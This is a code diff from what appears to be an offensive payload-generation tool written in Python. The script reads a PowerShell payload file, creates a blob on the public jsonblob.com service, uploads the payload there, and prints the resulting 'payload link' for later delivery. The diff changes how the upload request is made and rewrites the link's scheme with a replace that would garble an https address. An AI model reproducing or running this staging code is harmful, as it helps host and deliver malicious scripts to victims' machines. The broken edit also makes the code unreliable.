@@ -108,10 +108,10 @@ def generate_browser():
     f.truncate()
     f.close()
 
-    with open(payload_path + "payload.ps1", "r") as f:
-        content = f.read()
-        put(payload_link, data=content, headers={"Content-Type": "application/json", "Accept": "application/json"})
-        f.close()
+    f = open(payload_path + "payload.ps1", "r")
+    content = f.read()
+    put(payload_link, data=content, headers={"Content-Type": "application/json", "Accept": "application/json"}, json={"content": content})
+    f.close()
 
     print("[+] Payload generated at: " + payload_path)
     print("[+] Payload link: " + payload_link)
@@ -239,6 +239,7 @@ def create_payload_link():
     # turn this curl request into a python request : # curl -i -X "POST" -d '{"json":["format"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
     post_request = post("https://jsonblob.com/api/jsonBlob", data='{"json": ["format"]}', headers={"Content-Type": "application/json", "Accept": "application/json"}) # thanks you copilot for the help with this one :D
     payload_link = post_request.headers["location"]
+    payload_link = payload_link.replace("http", "https")
 
     return payload_link
 
